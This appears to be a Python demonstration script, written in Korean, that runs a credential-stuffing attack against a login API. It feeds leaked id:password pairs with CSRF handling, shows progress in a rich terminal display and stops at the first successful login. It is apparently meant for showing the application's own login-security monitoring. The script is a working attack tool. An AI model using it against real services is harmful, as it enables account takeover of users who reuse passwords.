#!/usr/bin/env python3
# /// script
# requires-python = ">=3.10"
# dependencies = ["rich>=13"]
# ///
"""크리덴셜 스터핑 시연 (#770) — 유출 목록을 계정마다 한 번씩 로그인 API에 넣는다.

실제 로그인 화면과 같은 API(`POST /api/auth/login`, CSRF 포함)로 들어간다. IP는 흉내 내지 않는다.
비밀번호를 재사용한 직원 계정은 파일에 적지 않고 실행할 때 --reused로 목록 중간에 끼운다.
그 계정이 맞으면 "적중"을 띄우고 멈춘다 — 조작자가 그 계정으로 브라우저에서 이어 간다.

  uv run scripts/demo/credential_stuffing.py --reused dohyun.lee:비밀번호
  uv run scripts/demo/credential_stuffing.py --base-url https://서버주소 --reused dohyun.lee:비밀번호 --reused-at 50

uv run이면 rich로 꾸민 화면(진행 막대 · 숫자판 · 흐르는 기록)이 나온다. rich가 없으면(python으로 바로 실행) 줄 출력으로 돌아간다.
로그인 보안 화면(관리자 › 접근 감시 › 로그인 보안)을 옆에 띄워 두고 돌린다.
"""
import argparse
import http.cookiejar
import json
import os
import sys
import time
import urllib.error
import urllib.request
from collections import deque
from pathlib import Path

ATTACK_UA = 'python-requests/2.32 (credential-stuffing demo)'
DEFAULT_LIST = Path(__file__).with_name('leaked_accounts.example.txt')
LOG_LINES = 15
# 흐름 페이지 터미널 예시와 같은 색 — 실패 연한 빨강 · 성공 초록 · 설명 회보라 · 안내 노랑 · 테두리 회색
FAIL, OK, DIM, WARN, LINE = '#FF8A80', '#7EE2A0', '#8C86A0', '#FFD27A', '#3A3548'


class Client:
    def __init__(self, base: str):
        self.base = base
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def _token(self) -> str | None:
        return next((c.value for c in self.jar if c.name == 'XSRF-TOKEN'), None)

    def csrf(self) -> None:
        self.opener.open(urllib.request.Request(self.base + '/api/auth/csrf', headers={'User-Agent': ATTACK_UA})).read()

    def login(self, login_id: str, password: str) -> int:
        if not self._token():
            self.csrf()
        request = urllib.request.Request(
            self.base + '/api/auth/login',
            data=json.dumps({'loginId': login_id, 'password': password}).encode(),
            headers={'Content-Type': 'application/json', 'X-XSRF-TOKEN': self._token() or '', 'User-Agent': ATTACK_UA},
            method='POST')
        try:
            with self.opener.open(request) as response:
                return response.status
        except urllib.error.HTTPError as error:
            return error.code


def read_list(path: Path) -> list[tuple[str, str]]:
    rows = []
    for line in path.read_text(encoding='utf-8').splitlines():
        line = line.strip()
        if not line or line.startswith('#') or ':' not in line:
            continue
        login_id, password = line.split(':', 1)
        rows.append((login_id.strip(), password))
    return rows


def run_rich(client: Client, rows, args, base: str) -> str | None:
    from rich.align import Align
    from rich.console import Console, Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import BarColumn, Progress, TextColumn
    from rich.table import Table
    from rich.text import Text

    console = Console()
    console.print(Panel(
        Text.assemble(
            ('$ ', 'bold white'), ('python stuffing.py --list leaked_accounts.txt\n', 'bold white'),
            (f'유출 목록 {len(rows)}줄 · 계정마다 한 번씩만 넣음 · 대상 {base}', DIM)),
        title=f'[bold {FAIL}]공격자 노트북[/] · 크리덴셜 스터핑', border_style=FAIL, padding=(1, 2)))
    if not args.no_pause:
        console.input(f'[{WARN}]Enter를 누르면 시작합니다[/] ')

    width = max(len(login_id) for login_id, _ in rows)
    log: deque[Text] = deque(maxlen=LOG_LINES)
    progress = Progress(
        TextColumn('[bold]시도'), BarColumn(bar_width=None, complete_style=FAIL, finished_style=OK),
        TextColumn('{task.completed}/{task.total}'), expand=True)
    task = progress.add_task('stuffing', total=len(rows))
    started = time.monotonic()
    counts = {'tried': 0, 'failed': 0, 'hit': 0}

    def board() -> Table:
        table = Table.grid(expand=True, padding=(0, 2))
        for _ in range(4):
            table.add_column(justify='center', ratio=1)
        table.add_row(
            Text.assemble(('시도\n', DIM), (f'{counts["tried"]}', 'bold white')),
            Text.assemble(('실패\n', DIM), (f'{counts["failed"]}', f'bold {FAIL}')),
            Text.assemble(('적중\n', DIM), (f'{counts["hit"]}', f'bold {OK}' if counts['hit'] else 'bold white')),
            Text.assemble(('경과\n', DIM), (f'{time.monotonic() - started:4.1f}초', 'bold white')))
        return table

    def screen() -> Group:
        body = Text('\n').join(log) if log else Text('…', style=DIM)
        return Group(
            Panel(Group(progress, Text(''), board()), border_style=LINE),
            Panel(body, title='시도 기록', title_align='left', border_style=LINE, height=LOG_LINES + 2))

    hit = None
    with Live(screen(), console=console, refresh_per_second=12) as live:
        for index, (login_id, password) in enumerate(rows, start=1):
            status = client.login(login_id, password)
            counts['tried'] += 1
            tag = f'[{index:02d}/{len(rows)}] {login_id.ljust(width)}'
            if status == 200:
                counts['hit'] += 1
                hit = login_id
                log.append(Text(f'{tag}  ✔ 로그인 성공', style=f'bold {OK}'))
            else:
                counts['failed'] += 1
                log.append(Text(f'{tag}  ✖ 실패 ({status})', style=FAIL))
            progress.update(task, completed=index)
            live.update(screen())
            if hit:
                break
            time.sleep(args.delay)
        live.update(screen())

    if hit:
        console.print(Panel(
            Align.center(Text.assemble(
                ('적중  ', f'bold {OK}'), (f' {hit} ', f'bold black on {OK}'), ('\n\n', ''),
                ('다른 사이트와 같은 비밀번호를 쓰던 계정 · 세션 쿠키 확보\n', 'white'),
                (f'시도 {counts["tried"]}건 · 실패 {counts["failed"]}건 · 맞힌 계정 1개\n\n', DIM),
                ('→ 이제 이 계정으로 브라우저에서 로그인해 이어 갑니다', f'bold {WARN}'))),
            border_style=OK, padding=(1, 2)))
    else:
        console.print(Panel(f'시도 {counts["tried"]}건 · 맞힌 계정 0개', border_style=LINE))
    return hit


def ansi(color: str) -> str:
    # 24비트 글자색 — rich 없이도 예시와 같은 색
    return f'\033[38;2;{int(color[1:3], 16)};{int(color[3:5], 16)};{int(color[5:7], 16)}m'


def run_plain(client: Client, rows, args, base: str) -> str | None:
    red, green, yellow, dim = ansi(FAIL), ansi(OK), ansi(WARN), ansi(DIM)
    bold, reset = '\033[1m', '\033[0m'
    print(f'{bold}$ python stuffing.py --list leaked_accounts.txt{reset}')
    print(f'{dim}유출 목록 {len(rows)}줄 · 계정마다 한 번씩만 넣음 · 대상 {base}{reset}')
    if not args.no_pause:
        input(f'{yellow}Enter를 누르면 시작합니다{reset}')
    width = max(len(login_id) for login_id, _ in rows)
    failures = 0
    hit = None
    for index, (login_id, password) in enumerate(rows, start=1):
        status = client.login(login_id, password)
        tag = f'[{index:02d}/{len(rows)}] {login_id.ljust(width)}'
        if status == 200:
            hit = login_id
            print(f'{green}{bold}{tag} ✔ 로그인 성공{reset}')
            break
        failures += 1
        print(f'{red}{tag} ✖ 실패 ({status}){reset}')
        time.sleep(args.delay)
    print(f'{bold}{"─" * 40}{reset}')
    if hit:
        print(f'{bold}결과: 시도 {failures + 1}건 · 실패 {failures}건 · 적중 계정 1개 ({hit}){reset}')
        print(f'{yellow}→ 이제 이 계정으로 브라우저에서 로그인해 이어 갑니다{reset}')
    else:
        print(f'{bold}결과: 시도 {failures}건 · 적중 계정 0개{reset}')
    return hit


def main() -> int:
    parser = argparse.ArgumentParser(description='크리덴셜 스터핑 시연 — 유출 목록을 로그인 API에 넣는다.')
    parser.add_argument('--base-url', default='http://localhost:8081')
    parser.add_argument('--list', type=Path, default=DEFAULT_LIST, help='한 줄에 아이디:비밀번호')
    parser.add_argument('--reused', help='비밀번호를 재사용한 직원 계정 아이디:비밀번호 (목록 중간에 끼운다)')
    parser.add_argument('--reused-at', type=int, default=50, help='재사용 계정을 넣을 순서(1부터). 경계 기준 30건 뒤에 둔다')
    parser.add_argument('--delay', type=float, default=0.4, help='시도 사이 초')
    parser.add_argument('--no-pause', action='store_true', help='시작 전 Enter를 기다리지 않는다')
    parser.add_argument('--plain', action='store_true', help='rich가 있어도 줄 출력으로')
    args = parser.parse_args()

    if os.name == 'nt':
        os.system('')  # 예전 Windows 콘솔에서도 색 코드를 켠다
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(errors='replace')

    rows = read_list(args.list)
    if args.reused:
        if ':' not in args.reused:
            parser.error('--reused는 아이디:비밀번호 모양이어야 합니다.')
        login_id, password = args.reused.split(':', 1)
        rows.insert(max(0, min(len(rows), args.reused_at - 1)), (login_id, password))
    if not rows:
        parser.error('목록이 비어 있습니다.')

    base = args.base_url.rstrip('/')
    client = Client(base)
    try:
        client.csrf()
    except urllib.error.URLError as error:
        print(f'{base}에 연결할 수 없습니다: {error.reason}', file=sys.stderr)
        return 2

    use_rich = not args.plain
    if use_rich:
        try:
            import rich  # noqa: F401
        except ImportError:
            use_rich = False
    (run_rich if use_rich else run_plain)(client, rows, args, base)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
